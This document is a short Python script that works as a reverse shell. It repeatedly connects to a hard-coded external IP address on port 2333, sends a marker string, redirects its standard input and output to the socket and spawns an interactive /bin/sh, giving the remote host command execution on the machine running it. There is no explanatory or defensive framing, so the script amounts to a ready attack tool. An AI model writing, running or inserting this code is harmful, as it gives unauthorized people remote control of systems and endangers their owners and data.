from socket import *
import subprocess
import os, threading
import time



def func():
    s=socket(AF_INET,SOCK_STREAM)
    while 1>0:
        try:
            s.connect(('23.83.249.21',2333))
            s.send("shellcoming")
            break
        except:
            time.sleep(10)
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"]);
func()